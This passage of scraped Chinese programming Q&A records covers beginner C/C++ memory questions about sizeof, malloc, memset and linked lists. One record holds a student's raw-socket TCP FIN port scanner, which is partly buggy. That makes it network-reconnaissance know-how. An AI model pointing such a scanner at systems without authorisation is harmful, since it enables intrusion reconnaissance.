"8", ") & ( ~ (", "sizeof", "(", "long", ") - ", "1", "));\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;  ***R_best &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;***)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;**) * NC_max);\n    &lt;span class=\"hljs-built_in\"&gt;memset&lt;/span&gt;(R_best, &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;**) * NC_max);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; NC_max; i&amp;#43;&amp;#43;) {\n        R_best[i] &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;**)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*) * n);\n        &lt;span class=\"hljs-built_in\"&gt;memset&lt;/span&gt;(R_best[i], &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*) * n);\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; n; j&amp;#43;&amp;#43;) {\n            R_best[i][j] &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;) * n);\n            &lt;span class=\"hljs-built_in\"&gt;memset&lt;/span&gt;(R_best[i][j], &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;) * n);\n        }\n    }\n    &lt;span class=\"hljs-comment\"&gt;//int R_best[NC_max][N][N];        //存储每次迭代的最佳路线&lt;/span&gt;\n \n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["动态申请三维数组一直显示溢出", ["问题遇到的现象和发生背景", "\n", "用蚁群算法解决MTSP问题，动态申请三维数组一直显示溢出", "\n", "用代码块功能插入代码，请勿粘贴截图", "\n", "int", "  ***R_best = (", "int", "***)", "malloc", "(", "sizeof", "(", "int", ") * NC_max);\n    ", "memset", "(R_best, ", "0", ", ", "sizeof", "(", "int", ") * NC_max);\n    ", "for", " (", "int", " i = ", "0", "; i < NC_max; i++) {\n        R_best[i] = (", "int", "**)", "malloc", "(", "sizeof", "(", "int", ") * n);\n        ", "memset", "(R_best[i], ", "0", ", ", "sizeof", "(", "int", ") * n);\n        ", "for", " (", "int", " j = ", "0", "; j < n; j++) {\n            R_best[i][j] = (", "int", "*)", "malloc", "(", "sizeof", "(", "int", ") * n);\n            ", "memset", "(R_best[i][j], ", "0", ", ", "sizeof", "(", "int", ") * n);\n        }\n    }\n    ", "//int R_best[NC_max][N][N];        //存储每次迭代的最佳路线", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这是计算数组的元素个数&lt;br /&gt;sizeof(s)可获得数组所占用的内存空间&amp;#xff0c;sizeof(int)获得整型占用的内存空间&amp;#xff0c;两者相除的结果就是数组一共有多少个元素&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个简单的问题请教一下", ["#include <stdio.h>", "\n", "//宏定义", "\n", "#define func(x) x*2+2", "\n", "int main()", "{", "int s[func (2)*func(3)+90];s['A']=1;", "\n", "s[1]=6;", "\n", "printf(\"%d %d\", sizeof(s) / sizeof(int), s[s['A']]);return 0;", "\n", "}", "sizeof（s）/sizeof（int）是啥意思"]], "Tag": "程序设计"}
{"Answer": "链表无非就是用指针把一个个节点连接起来，可以自己画一个简易图，针对你的问题：\r\n（1）ListNode *head=NULL，这里是定义头节点指针，你后面所有的操作都要以头节点为依据，初始化头节点为空，方便做安全校验。\r\n（2）Create函数中，LN=(ListNode*)malloc(sizeof(ListNode)) 以及 p=(ListNode*)malloc(sizeof(ListNode)); 这里用malloc分配内存，是在堆上的，\r\n只要你不去free就不会释放，一直存在，然后这里的LN和P保存了内存的地址，后面的操作就可以根据地址来访问内存；\r\n直接ListNode* LN和ListNode* p这只是两个指针变量，并不是一个完整的节点，只是ListNode* 而不是ListNode；\r\n最开始struct那里 ListNode*head定义的时候没malloc分配内存是因为这里只是定义的一个头节点指针，这个链表的一个标志，并不是一个节点，所以不用。\r\n（3）插入，p-&gt;next = LN-&gt;next;是将P节点的下一个指针指向插入位置的下一个节点，LN-&gt;next = p;是将插入位置节点的下一个指向P节点，这样实现一个节点的插入；\r\n如果写 p-&gt;next = LN; LN-&gt;next = p; 就是让p节点的下一个指针指向LN节点，LN节点的下一个指针指向P节点，这就相互指向，形成了一个小环，这就不是插入了。\r\n（4）不让头节点移动到末端就定义一个临时变量指针来遍历就可以了。\r\n链表没什么的，可以自己多写写，单向链表，双向链表，增删改查", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请教一个C++链表(linked list)的创建和遍历的基础问题", ["我从前对C++链表不太熟悉，现在看书上有一个例子讲链表的创建和遍历：", "\n\n", "struct ListNode\n    {\n    int content;\n    ListNode *next;\n    }; // 请问：这里写或者不写“ListNode *head=NULL;”有什么区别？\n\nvoid List_Create(ListNode *&LN, int array[], int n)\n    {\n    ListNode* p;\n    int i;\n    LN = (ListNode*)malloc(sizeof(ListNode)); // 请问：这里的LN为什么要用malloc分配内存呢？直接ListNode* LN为什么不行呢？\n    LN->next = NULL; // 把LN作为结尾指向NULL.\n    for(i=n-1; i>=0; i--)\n        {\n        p = (ListNode*)malloc(sizeof(ListNode)); // 请问：这里的p为什么要用malloc分配内存呢？直接ListNode* p为什么不行呢？\n        p->content = array[i];\n        p->next = LN->next; // 直接写p->next = LN为什么不对呢？\n        LN->next = p; // 请问：为什么前面是把LN-next赋给p-next、这里却把p整个赋给了LN呢？\n        }\n    }\n\nvoid List_Display(ListNode *&LN)\n    {\n    cout << \"\\nThe displayed list is: \" << endl;\n    while(LN -> next != NULL)\n        {\n        cout << LN->next->content << \" \";\n        LN = LN->next;\n        }\n    cout << endl;\n    }\n", "\n\n", "请教一下大家4个问题：", "\n\n", "1 最开始的struct那一段，结尾处写或者不写 ListNode *head=NULL有什么区别？", "\n\n", "2 Create函数中，LN=(ListNode*)malloc(sizeof(ListNode)) 以及 p=(ListNode*)malloc(sizeof(ListNode)); 请问：这里的LN为什么要用malloc分配内存呢？直接ListNode* LN和ListNode* p为什么不行呢？最开始struct那里 ListNode*head定义的时候也没malloc分配内存啊？", "\n\n", "3 Create函数中，p->next = LN->next; LN->next = p;这应该是实现p的插入。但是为什么前面是把LN-next赋给p-next、后面却把p整个赋给了LN-next呢？ 如果写 p->next = LN; LN->next = p; 这样看起来更一致，为什么不对呢？", "\n\n", "4 Display函数虽然遍历了整个链表，但是也事实上移动到了链表的末端。有没有什么办法能既遍历、又不移动到末端呢？", "\n\n", "谢谢了先！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;强制转换一下类型就可以了&amp;#xff0c;如下&amp;#xff1a;&lt;br /&gt;printf(“size of int &amp;#61; %d bytes \\n&amp;#34;,(int)sizeof(a)); //这里加&amp;#xff08;int&amp;#xff09;强转&lt;br /&gt;printf(“size of long &amp;#61; %d bytes \\n&amp;#34;,(int)sizeof(b));&lt;br /&gt;printf(“size of long long &amp;#61; %d bytes \\n&amp;#34;,(int)sizeof(c));&lt;br /&gt;printf(“size of long double &amp;#61; %d bytes \\n&amp;#34;,(int)sizeof(a));&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言（c6328大小不匹配）", ["int a;", "long b;", "long long c;", "long double s;", "printf(“size of int = %d bytes \\n\",sizeof(a));", "printf(“size of long = %d bytes \\n\",sizeof(b));", "printf(“size of long long = %d bytes \\n\",sizeof(c));", "printf(“size of long double = %d bytes \\n\",sizeof(a));", " getchar;", "return 0;", "vs2019警告c6328 :大小不匹配 :已将unsigned_64作为__Param_(2)传递,但需要使用int来调用printf", "这是应该怎么处理才能消除这个警告?拜托有木有大佬求指教"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;** generate&lt;span class=\"hljs-constructor\"&gt;Matrix(&lt;span class=\"hljs-params\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;n&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;returnSize&lt;/span&gt;, &lt;span class=\"hljs-params\"&gt;int&lt;/span&gt;&lt;span class=\"hljs-operator\"&gt;**&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;returnColumnSizes&lt;/span&gt;)&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;参数列表后两个出参都没有赋值&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc分配二维数组缓冲溢出", ["leetcode 59 螺旋数组", "使用malloc函数分配二维数组内存", "使用内存时出现指针越界", "凡是使用了二维数组的都显示缓冲溢出的报错", "请问怎么分配二维数组的内存 并检查内存分配是否有效", "\n", "int** generateMatrix(int n, int* returnSize, int** returnColumnSizes) {\n    int i, j;\n    int mid = n / ", "2", ";\n    int loop = n / ", "2", ";\n    int startx = ", "0", ", starty = ", "0", ";\n    int offset = ", "1", ";\n    int count = ", "1", ";\n    int** res = (int**)malloc(sizeof(int*) * n);\n    ", "if", " (res == NULL)   ", "//", "表示的是地址为空的情况\n        ", "exit", "(", "1", ");\n    ", "for", " (int k = ", "0", "; k < n; k++)\n    {\n        *(res + k) = (int*)malloc(sizeof(int) * n);\n    }\n    ", "if", " (*res == NULL)\n        ", "exit", "(", "1", ");\n        \n\n    ", "//", "二维数组内存的动态分配\n\n    ", "while", " (loop--)\n    {\n        i = startx;\n        j = starty;\n\n        ", "//", " 下面开始的四个", "for", "就是模拟转了一圈\n        ", "//", " 模拟填充上行从左到右(左闭右开)\n        ", "for", " (j = starty; j < n - offset; j++) {\n            res[startx][j] = count++;\n        }\n        ", "//", " 模拟填充右列从上到下(左闭右开)\n        ", "for", " (i = startx; i < n - offset; i++) {\n            res[i][j] = count++;\n        }\n        ", "//", " 模拟填充下行从右到左(左闭右开)\n        ", "for", " (; j > starty; j--) {\n            res[i][j] = count++;\n        }\n        ", "//", " 模拟填充左列从下到上(左闭右开)\n        ", "for", " (; i > startx; i--) {\n            res[i][j] = count++;\n        }\n        startx--;\n        starty--;\n        offset++;\n    }\n\n    ", "if", " (n % ", "2", ")\n        res[mid][mid] = count;\n    \n    return res;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;void *memset(void *s, int ch, size_t n);解释&amp;#xff1a;将s中当前位置后面的n个字节用ch替换并返回s。&lt;/p&gt;\n\n&lt;p&gt;这三种方式的结果是一样的。初始化的结果是一样的&amp;#xff0c;但是最好直接使用第一种叭&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["memset数组问题", ["当我们进行初始化数组时，使用memset，", "\n\n", "1.memset（a,0,sizeof(a)）;", "\n\n", "2,memset (&a,0,sizeof(a));", "\n\n", "3,memset(&a[0],0,sizeof(a));", "\n\n", "这三种对数组的初始化有什么区别吗？最终初始化的结果都是一样的吗？", "\n\n", "谢谢各位大大佬！！"]], "Tag": "程序设计"}
{"Answer": "OnBnClickedButton1中的调用阻塞了消息循环。把send_revc中的waitForMultiObjects函数去掉吧，可以使用afxbeginthread（）开启线程，并设置CWinThread类的成员变量m_bAutoDelete为TRUE。或者设置等待窗口，等待线程完成。反正WaitForMuliObjects阻塞了消息循环，所以在revc线程中添加ListBox条目会被阻塞。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["新人求教，我用mfc做了一个tcp fin的端口扫描器，死后得不出结果，求大神帮忙找出问题", ["cpp文件", "\n\n", "// scanDlg.cpp : implementation file", "\n//", "\n\n", "#include \"stdafx.h\"", "\n#include \"scan.h\"", "\n#include \"scanDlg.h\"", "\n#include \"afxdialogex.h\"", "\n\n", "#ifdef _DEBUG", "\n#define new DEBUG_NEW", "\n#endif", "\n\n", "// CAboutDlg dialog used for App About", "\n\n", "class CAboutDlg : public CDialogEx", "\n{", "\npublic:", "\n    CAboutDlg();", "\n\n", "// Dialog Data", "\n    enum { IDD = IDD_ABOUTBOX };", "\n\n", "protected:\nvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support\n", "\n\n", "// Implementation", "\nprotected:", "\n    DECLARE_MESSAGE_MAP()", "\n};", "\n\n", "CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)", "\n{", "\n}", "\n\n", "void CAboutDlg::DoDataExchange(CDataExchange* pDX)", "\n{", "\n    CDialogEx::DoDataExchange(pDX);", "\n}", "\n\n", "BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)", "\nEND_MESSAGE_MAP()", "\n\n", "// CscanDlg dialog", "\n\n", "CscanDlg::CscanDlg(CWnd* pParent /*=NULL*/)", "\n    : CDialogEx(CscanDlg::IDD, pParent)", "\n    , m_star_port(_T(\"\"))", "\n    , m_end_port(_T(\"\"))", "\n    , m_IP(_T(\"\"))", "\n{", "\n    m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);", "\n}", "\n\n", "void CscanDlg::DoDataExchange(CDataExchange* pDX)", "\n{", "\n    CDialogEx::DoDataExchange(pDX);", "\n    DDX_Control(pDX, IDC_LIST1, m_list);", "\n    DDX_Text(pDX, IDC_EDIT2, m_star_port);", "\n    DDX_Text(pDX, IDC_EDIT3, m_end_port);", "\n    DDX_Text(pDX, IDC_EDIT1, m_IP);", "\n}", "\n\n", "BEGIN_MESSAGE_MAP(CscanDlg, CDialogEx)", "\n    ON_WM_SYSCOMMAND()", "\n    ON_WM_PAINT()", "\n    ON_WM_QUERYDRAGICON()", "\n    ON_BN_CLICKED(IDC_BUTTON1, &CscanDlg::OnBnClickedButton1)", "\nEND_MESSAGE_MAP()", "\n\n", "// CscanDlg message handlers", "\n\n", "BOOL CscanDlg::OnInitDialog()", "\n{", "\n    CDialogEx::OnInitDialog();", "\n\n", "// Add \"About...\" menu item to system menu.\n\n// IDM_ABOUTBOX must be in the system command range.\nASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);\nASSERT(IDM_ABOUTBOX < 0xF000);\n\nCMenu* pSysMenu = GetSystemMenu(FALSE);\nif (pSysMenu != NULL)\n{\n    BOOL bNameValid;\n    CString strAboutMenu;\n    bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);\n    ASSERT(bNameValid);\n    if (!strAboutMenu.IsEmpty())\n    {\n        pSysMenu->AppendMenu(MF_SEPARATOR);\n        pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);\n    }\n}\n\n// Set the icon for this dialog.  The framework does this automatically\n//  when the application's main window is not a dialog\nSetIcon(m_hIcon, TRUE);         // Set big icon\nSetIcon(m_hIcon, FALSE);        // Set small icon\n\n// TODO: Add extra initialization here\n\nreturn TRUE;  // return TRUE  unless you set the focus to a control\n", "\n\n", "}", "\nhostent*  CscanDlg::g_pHost = 0;", "\n SOCKET  CscanDlg::sock = 0;", "\n\n", "void CscanDlg::OnSysCommand(UINT nID, LPARAM lParam)", "\n{", "\n    if ((nID & 0xFFF0) == IDM_ABOUTBOX)", "\n    {", "\n        CAboutDlg dlgAbout;", "\n        dlgAbout.DoModal();", "\n    }", "\n    else", "\n    {", "\n        CDialogEx::OnSysCommand(nID, lParam);", "\n    }", "\n}", "\n\n", "// If you add a minimize button to your dialog, you will need the code below", "\n//  to draw the icon.  For MFC applications using the document/view model,", "\n//  this is automatically done for you by the framework.", "\n\n", "void CscanDlg::OnPaint()", "\n{", "\n    if (IsIconic())", "\n    {", "\n        CPaintDC dc(this); // device context for painting", "\n\n", "    SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);\n\n    // Center icon in client rectangle\n    int cxIcon = GetSystemMetrics(SM_CXICON);\n    int cyIcon = GetSystemMetrics(SM_CYICON);\n    CRect rect;\n    GetClientRect(&rect);\n    int x = (rect.Width() - cxIcon + 1) / 2;\n    int y = (rect.Height() - cyIcon + 1) / 2;\n\n    // Draw the icon\n    dc.DrawIcon(x, y, m_hIcon);\n}\nelse\n{\n    CDialogEx::OnPaint();\n}\n", "\n\n", "}", "\n\n", "// The system calls this function to obtain the cursor to display while the user drags", "\n//  the minimized window.", "\nHCURSOR CscanDlg::OnQueryDragIcon()", "\n{", "\n    return static_cast(m_hIcon);", "\n}", "\n\n", "void CscanDlg::OnBnClickedButton1()", "\n{", "\n    // TODO: Add your control notification handler code here", "\n    send_revc((LPSTR)(LPCTSTR)m_IP,(LPSTR)(LPCTSTR)m_star_port,(LPSTR)(LPCTSTR)m_end_port,&m_list);//char ch1[],char tr1[],char tr2[]", "\n}", "\n\n", "void CscanDlg ::send_revc(char ch1[],char tr1[],char tr2[],CListBox* m_list)", "\n{", "\n    WSADATA WSAData;", "\n    WSAStartup(MAKEWORD(2,2), &WSAData);", "\n    sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);//定义套接字", "\n    BOOL flag = true;", "\n    setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char ", ")&flag,sizeof(flag));", "\n    char sLocalName[64]; ", "\n    gethostname((char", ")sLocalName, sizeof(sLocalName)-1);", "\n    g_pHost = gethostbyname(sLocalName);", "\n    sockaddr_in addr_local; ", "\n    addr_local.sin_addr = *(in_addr *)g_pHost->h_addr_list[0]; //绑定到本地网卡,INADDR_ANY不行", "\n    addr_local.sin_family = AF_INET;//", "\n    addr_local.sin_port = htons(SOURCE_PORT);", "\n    bind(sock, (PSOCKADDR)&addr_local, sizeof(sockaddr_in));//绑套接字", "\n    DWORD dwValue = 1;", "\n    SADDR sAddr;", "\n    USHORT int1,int2;", "\n    sAddr.m_destip=ch1;", "\n    sAddr.m_starpost=atoi(tr1);", "\n    sAddr.m_endpost=atoi(tr2);", "\n\n", "ioctlsocket(sock, SIO_RCVALL, &dwValue);\nint  nTimeOut = 500;//设置超时\nsetsockopt(sock,SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOut, sizeof(nTimeOut));\nHANDLE threads[2];//开双线程\nthreads[0] = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)revcfunc,(LPVOID)m_list,0,NULL);\nthreads[1] = CreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)sendfunc,(LPVOID)(&sAddr), 0,NULL);\nWaitForMultipleObjects(2,threads,FALSE,INFINITE); \n", "\n\n", "}", "\n    USHORT CscanDlg ::checksumfunc(USHORT ", "buffer, int size)//检验和函数", "\n    {", "\n    unsigned long cksum=0;", "\n    while(size >1)", "\n    {", "\n        cksum+=*buffer++;", "\n        size -=sizeof(USHORT);", "\n    }", "\n    if(size)", "\n    {", "\n        cksum += *(UCHAR", ")buffer;", "\n    }", "\n\n", "cksum = (cksum >> 16) + (cksum & 0xffff);\ncksum += (cksum >>16);\nreturn (USHORT)(~cksum);\n}\nvoid CscanDlg ::sendfunc(SADDR* sAddr )\n{\nIP_HEADER ipHeader;\nTCP_HEADER tcpHeader;\nPSD_HEADER psdHeader;\nchar Sendto_Buff[MAX_BUFF_LEN];  //发送缓冲区\nunsigned short check_Buff[MAX_BUFF_LEN]; //检验和缓冲区\nconst char tcp_send_data[]={\"This is my homework of networt,I am happy!\"};\nBOOL flag;\nint rect,nTimeOver;\n//先试一下在外面弄好套接字初始化行不行\nflag=true;\nnTimeOver=1000;\n    //填充IP首部\nipHeader.h_verlen=(IPVER<<4 | sizeof(ipHeader)/sizeof(unsigned long));\nipHeader.tos=(UCHAR)0;\nipHeader.total_len=htons((unsigned short)sizeof(ipHeader)+sizeof(tcpHeader)+sizeof(tcp_send_data));\nipHeader.ident=0;       //16位标识\nipHeader.frag_and_flags=0; //3位标志位\nipHeader.ttl=128; //8位生存时间\nipHeader.proto=IPPROTO_UDP; //协议类型\nipHeader.checksum=0; //检验和暂时为0\nipHeader.sourceIP=*(int*)g_pHost->h_addr_list[0];  //32位源IP地址可以直接获取\nipHeader.destIP=inet_addr(sAddr->m_destip);    //32位目的IP地址\n\n//计算IP头部检验和\nmemset(check_Buff,0,MAX_BUFF_LEN);\nmemcpy(check_Buff,&ipHeader,sizeof(IP_HEADER));\nipHeader.checksum=checksumfunc(check_Buff,sizeof(IP_HEADER));\n\n//构造TCP伪首部\npsdHeader.saddr=ipHeader.sourceIP;\npsdHeader.daddr=ipHeader.destIP;\npsdHeader.mbz=0;\npsdHeader.ptcl=ipHeader.proto;\npsdHeader.tcpl=htons(sizeof(TCP_HEADER)+sizeof(tcp_send_data));\nfor(int i=sAddr->m_starpost;i<sAddr->m_endpost;i++)\n//填充TCP首部\n{\ntcpHeader.th_dport=htons(i); //16位目的端口号\ntcpHeader.th_sport=htons(SOURCE_PORT); //16位源端口号\ntcpHeader.th_seq=0;                         //SYN序列号\ntcpHeader.th_ack=0;                         //ACK序列号置为0\n//TCP长度和保留位\ntcpHeader.th_lenres=(sizeof(tcpHeader)/sizeof(unsigned long)<<4|0);\ntcpHeader.th_flag=1; //修改这里来实现不同的标志位探测，2是SYN，1是//FIN，16是ACK探测 等等\ntcpHeader.th_win=htons((unsigned short)16384);     //窗口大小\ntcpHeader.th_urp=0;                            //偏移大小   \ntcpHeader.th_sum=0;                            //检验和暂时填为0\n\n//计算TCP校验和\nmemset(check_Buff,0,MAX_BUFF_LEN);\nmemcpy(check_Buff,&psdHeader,sizeof(psdHeader));\nmemcpy(check_Buff+sizeof(psdHeader),&tcpHeader,sizeof(tcpHeader));\nmemcpy(check_Buff+sizeof(PSD_HEADER)+sizeof(TCP_HEADER),\ntcp_send_data,sizeof(tcp_send_data));\ntcpHeader.th_sum=checksumfunc(check_Buff,sizeof(PSD_HEADER)+\nsizeof(TCP_HEADER)+sizeof(tcp_send_data));\n\n//填充发送缓冲区\nmemset(Sendto_Buff,0,MAX_BUFF_LEN);\nmemcpy(Sendto_Buff,&ipHeader,sizeof(IP_HEADER));\nmemcpy(Sendto_Buff+sizeof(IP_HEADER),&tcpHeader,\nsizeof(TCP_HEADER));\nmemcpy(Sendto_Buff+sizeof(IP_HEADER)+sizeof(TCP_HEADER),\ntcp_send_data,sizeof(tcp_send_data));\nint datasize=sizeof(IP_HEADER)+sizeof(TCP_HEADER)+\nsizeof(tcp_send_data);\n//发送数据报的目的地址\nSOCKADDR_IN dest;   \nmemset(&dest,0,sizeof(dest));\ndest.sin_family=AF_INET;\ndest.sin_addr.s_addr=inet_addr(sAddr->m_destip);\ndest.sin_port=htons(i);\nrect=sendto(sock,Sendto_Buff,datasize, 0,(struct sockaddr*)&dest, sizeof(dest));\n}\n}\nvoid CscanDlg ::revcfunc(CListBox* m_list)\n{\nCString str;\nchar RecvBuf[MAX_BUFF_LEN]; \nIP_HEADER* ip;\nTCP_HEADER* tcp; \n    while(1)\n", "\n\n", "{", "\nint ret = recv(sock, RecvBuf, MAX_BUFF_LEN, 0);", "\nif (ret > 0)", "\n{ ", "\nip = (IP_HEADER*)RecvBuf;", "\ntcp = (TCP_HEADER*)(RecvBuf + (ip->h_verlen&0x0f)*4);", "\nstr.Format(_T(\"%hu\"), tcp->th_sport);", "\nm_list->AddString(str);", "\n}", "\n\n", "else str.Format(_T(\"%d\"),ret),m_list->AddString(str);", "\n}", "\n    }", "\n\n", "头文件// scanDlg.h : header file", "\n//", "\n\n", "#pragma once", "\n#include", "\n#include", "\n#include", "\n#pragma comment(lib,\"ws2_32.lib\")", "\n//#define SIO_RCVALL_WSAIOW(IOC_VENDOR,1)", "\n#include ", "\n#include ", "\n#include ", "\n#include \"afxwin.h\"", "\n#define IPVER   4   //IP协议预定", "\n#define MAX_BUFF_LEN 65500  //发送缓冲区最大值", "\n#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)", "\n#define SOURCE_PORT 8088 //local TCP segment source port", "\n// CscanDlg dialog", "\nclass CscanDlg : public CDialogEx", "\n{", "\n// Construction", "\npublic:", "\n    CscanDlg(CWnd* pParent = NULL); // standard constructor", "\n\n", "// Dialog Data", "\n    enum { IDD = IDD_SCAN_DIALOG };", "\n    typedef struct ip_hdr    //定义IP首部", "\n{", "\nUCHAR h_verlen;            //4位首部长度,4位IP版本号", "\nUCHAR tos;                //8位服务类型TOS", "\nUSHORT total_len;        //16位总长度（字节）", "\nUSHORT ident;            //16位标识", "\nUSHORT frag_and_flags;    //3位标志位", "\nUCHAR ttl;                //8位生存时间 TTL", "\nUCHAR proto;            //8位协议 (TCP, UDP 或其他)", "\nUSHORT checksum;        //16位IP首部校验和", "\nULONG sourceIP;            //32位源IP地址", "\nULONG destIP;            //32位目的IP地址", "\n}IP_HEADER;", "\n    typedef struct tsd_hdr //定义TCP伪首部", "\n{", "\nULONG saddr;    //源地址", "\nULONG daddr;    //目的地址", "\nUCHAR mbz;        //没用", "\nUCHAR ptcl;        //协议类型", "\nUSHORT tcpl;    //TCP长度", "\n}PSD_HEADER;", "\n    typedef struct tcp_hdr //定义TCP首部", "\n{", "\nUSHORT th_sport;            //16位源端口", "\nUSHORT th_dport;            //16位目的端口", "\nULONG th_seq;                //32位序列号", "\nULONG th_ack;                //32位确认号", "\nUCHAR th_lenres;            //4位首部长度/6位保留字", "\nUCHAR th_flag;                //6位标志位", "\nUSHORT th_win;                //16位窗口大小", "\nUSHORT th_sum;                //16位校验和", "\nUSHORT th_urp;                //16位紧急数据偏移量", "\n}TCP_HEADER;", "\n    typedef struct SADDR //定义TCP首部", "\n{", "\n    char* m_destip;", "\n    USHORT m_starpost;", "\n    USHORT m_endpost;", "\n\n", "};", "\n    USHORT static checksumfunc(USHORT ", "buffer, int size);", "\n    void static sendfunc(SADDR", " sAddr);", "\n    void static revcfunc(CListBox* m_list);", "\n    void send_revc(char ch1[],char tr1[],char tr2[],CListBox* m_list);", "\n    SOCKET static sock; //用于收发TCP报文段的全局socket", "\n    hostent static *g_pHost;", "\n\n", "protected:\nvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support\n", "\n\n", "// Implementation", "\nprotected:", "\n    HICON m_hIcon;", "\n\n", "// Generated message map functions\nvirtual BOOL OnInitDialog();\nafx_msg void OnSysCommand(UINT nID, LPARAM lParam);\nafx_msg void OnPaint();\nafx_msg HCURSOR OnQueryDragIcon();\nDECLARE_MESSAGE_MAP()\n", "\n\n", "public:", "\n    CListBox m_list;", "\n    afx_msg void OnBnClickedButton1();", "\n    CString m_star_port;", "\n    CString m_end_port;", "\n    CString m_IP;", "\n};"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;s &amp;#61; &amp;#34;hello world&amp;#34;; 这修改了s指针地址&amp;#xff0c;当然不能free了&lt;br /&gt;改为strcpy(s,&amp;#34;hello world&amp;#34;);&lt;br /&gt;头文件增加#include &amp;lt;string.h&amp;gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["字符串指针释放free", ["用malloc申请了一个12字节的内存空间，用char*指针指向，最后free释放的时候引发异常不能运行，帮忙解答一下原因和解决办法吧，万分感谢", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "void", " ", "main", "()", "\n", "{\n    ", "char", "* s = (", "char", "*)", "malloc", "(", "sizeof", "(", "char", ") * ", "12", ");\n    ", "if", " (s != ", "NULL", ")\n    {\n        s = ", "\"hello world\"", ";\n        ", "printf", "(", "\"%s\"", ", s);\n    }\n", "free", "(s);\n}\n", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;(), &lt;span class=\"hljs-type\"&gt;double&lt;/span&gt; len)&lt;/span&gt;&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;你是想写double[]吧&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["编译器报错，这啥意思，该如何修改", ["编译器报错，这啥意思，该如何修改", "\n", "\n", "\n// 返回引用", "2.", "cpp : 此文件包含 \"main\" 函数。程序执行\n", "#include <iostream>", "\n", "#include <string.h>", "\n", "using", " namespace std;\n", "void", " sort(", "int", "[], ", "int", " len);\n", "void", " sort(", "float", "[], ", "int", " len);\n", "void", " 